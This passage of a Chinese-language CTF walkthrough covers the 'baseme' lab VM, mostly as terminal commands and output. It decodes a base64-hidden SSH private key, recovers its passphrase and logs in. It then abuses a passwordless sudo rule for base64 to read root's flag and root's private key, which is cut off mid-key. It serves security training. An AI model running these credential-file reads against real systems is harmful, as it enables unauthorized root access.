class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ curl  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span>/aWRfcnNhCg== </span><br><span class="line">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB</span><br><span class="line">QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB</span><br><span class="line">ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY</span><br><span class="line">dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK</span><br><span class="line">RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ</span><br><span class="line">NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0</span><br><span class="line">TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP</span><br><span class="line">NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY</span><br><span class="line">d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj</span><br><span class="line">MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz</span><br><span class="line">aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto</span><br><span class="line">VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0</span><br><span class="line">cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK</span><br><span class="line">Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy</span><br><span class="line">UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13</span><br><span class="line">NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz</span><br><span class="line">UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE</span><br><span class="line">eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH</span><br><span class="line">UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX</span><br><span class="line">THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3</span><br><span class="line">SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk</span><br><span class="line">eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK</span><br><span class="line">bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or</span><br><span class="line">aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4</span><br><span class="line">SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3</span><br><span class="line">UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5</span><br><span class="line">bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl</span><br><span class="line">azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No</span><br><span class="line">MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl</span><br><span class="line">YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq</span><br><span class="line">T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U</span><br><span class="line">Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r</span><br><span class="line">NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==</span><br><span class="line">                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ curl  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span>/cm9ib3RzLnR4dAo=</span><br><span class="line">Tm90aGluZyBoZXJlIDooCg==</span><br><span class="line">                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ echo <span class="string">&quot;Tm90aGluZyBoZXJlIDooCg==&quot;</span> | base64 --decode</span><br><span class="line">Nothing here :(</span><br><span class="line">                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ echo <span class="string">&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB</span></span><br><span class="line"><span class="string">QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB</span></span><br><span class="line"><span class="string">ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY</span></span><br><span class="line"><span class="string">dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK</span></span><br><span class="line"><span class="string">RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ</span></span><br><span class="line"><span class="string">NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0</span></span><br><span class="line"><span class="string">TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP</span></span><br><span class="line"><span class="string">NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY</span></span><br><span class="line"><span class="string">d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj</span></span><br><span class="line"><span class="string">MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz</span></span><br><span class="line"><span class="string">aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto</span></span><br><span class="line"><span class="string">VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0</span></span><br><span class="line"><span class="string">cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK</span></span><br><span class="line"><span class="string">Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy</span></span><br><span class="line"><span class="string">UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13</span></span><br><span class="line"><span class="string">NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz</span></span><br><span class="line"><span class="string">UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE</span></span><br><span class="line"><span class="string">eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH</span></span><br><span class="line"><span class="string">UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX</span></span><br><span class="line"><span class="string">THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3</span></span><br><span class="line"><span class="string">SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk</span></span><br><span class="line"><span class="string">eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK</span></span><br><span class="line"><span class="string">bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or</span></span><br><span class="line"><span class="string">aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4</span></span><br><span class="line"><span class="string">SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3</span></span><br><span class="line"><span class="string">UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5</span></span><br><span class="line"><span class="string">bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl</span></span><br><span class="line"><span class="string">azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No</span></span><br><span class="line"><span class="string">MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl</span></span><br><span class="line"><span class="string">YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq</span></span><br><span class="line"><span class="string">T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U</span></span><br><span class="line"><span class="string">Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r</span></span><br><span class="line"><span class="string">NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==&quot;</span> | base64 --decode</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line">07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh</span><br><span class="line">7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv</span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK</span><br><span class="line">xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs</span><br><span class="line">+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ</span><br><span class="line">zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span><br><span class="line">IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span><br><span class="line">+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span><br><span class="line">tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span><br><span class="line">N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span><br><span class="line">O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span>/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span><br><span class="line">ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span><br><span class="line">LdmmRXUS/DtO+<span class="number">69</span>/aidvxGAYob+1M=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">                                    </span><br></pre></td></tr></table></figure>

<p>这里我们将id_rsa保存下来尝试登录ssh</p>
<p>用户名是lucas，需要我们输入key，前面我们在源代码中发现了几段话，将其base64编码后尝试输入key</p>
<p>得到key是aWxvdmV5b3UK—-&gt;iloveyou</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ ssh -i id_rsa lucas@<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line"></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Linux baseme <span class="number">4.19</span><span class="number">.0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Sep <span class="number">28</span> <span class="number">12</span>:<span class="number">51</span>:<span class="number">36</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.58</span></span><br><span class="line">lucas@baseme:~$ </span><br></pre></td></tr></table></figure>

<p>接下来尝试提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lucas@baseme:~$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null                                                                                                   </span><br><span class="line">/usr/<span class="built_in">bin</span>/sudo                                                                                                                                                     </span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn                                                                                                                                                        </span><br><span class="line">/usr/<span class="built_in">bin</span>/mount</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/su</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">lucas@baseme:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> lucas on baseme:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User lucas may run the following commands on baseme:</span><br><span class="line">    (ALL) NOPASSWD: /usr/<span class="built_in">bin</span>/base64</span><br><span class="line">lucas@baseme:~$ find / -writable -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null |grep -viE <span class="string">&quot;var|proc|sys|home&quot;</span></span><br><span class="line">lucas@baseme:~$ </span><br></pre></td></tr></table></figure>

<p>我们可以以 root 权限无密码运行 &#x2F;usr&#x2F;bin&#x2F;base64</p>
<p>这里我们可以直接读文件了</p>
<p>直接读root.txt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">lucas@baseme:~$ sudo /usr/<span class="built_in">bin</span>/base64 /root/root.txt</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAqKiAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAq</span><br><span class="line">ICAgICAgICAgICAqLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwqICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICosICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICwgICAgICAgICAgICAgICAgICAgICAgICAgLCogICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAKICAgICAgICAgICAgICAgICAgICAgIC4sICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgKiwgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAgICAgICAgICAgICAgICAgICAgICAKICAg</span><br><span class="line">ICAgICAgICAgICAgICAsKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAq</span><br><span class="line">LCAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgLy4gICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgIC4qLiAgICAgICAgICAgICAgICAKICAgICAgICAgICAg</span><br><span class="line">ICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoqICAg</span><br><span class="line">ICAgICAgICAgICAKICAgICAgICAgICAgICwqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAsKiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICoqICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKi4gICAgICAgICAgICAgICAg</span><br><span class="line">ICAKICAgICAgICAgICAgICAgICAgICoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgKiouICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgLCogICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICoqICAgICAgICAgICAgICAgICAgICAgICAKICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgKiwgICAgICAgICAgICAgICAgICAgICAgICAgICwqICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAqKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAqLCAgICAgICAgICAgICAgICAuKiAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLiAgICAgICAgICAgKiog</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICoqICAgICAgLCosICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoqICosICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAKSE1WRktCUzY0Cg==</span><br><span class="line">lucas@baseme:~$ echo <span class="string">&quot;KSE1WRktCUzY0Cg==&quot;</span> |base64</span><br><span class="line">S1NFMVdSa3RDVXpZMENnPT0K</span><br><span class="line">lucas@baseme:~$ echo <span class="string">&quot;KSE1WRktCUzY0Cg==&quot;</span> |base64 --decode</span><br><span class="line">)!5Y-   L��(base64: invalid <span class="built_in">input</span></span><br><span class="line">lucas@baseme:~$ echo <span class="string">&quot;ICAgICAgICAgICAgICAKSE1WRktCUzY0Cg==&quot;</span> |base64 --decode</span><br><span class="line">              </span><br><span class="line">HMVFKBS64</span><br><span class="line">lucas@baseme:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们如果想要登录root的话就需要读取root的id_rsa</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B</span><br><span class="line">IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp</span><br><span class="line">DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk</span><br><span class="line">/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7</span><br><span class="line">px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a</span><br><span class="line">S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ</span><br><span class="line">7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx</span><br><span 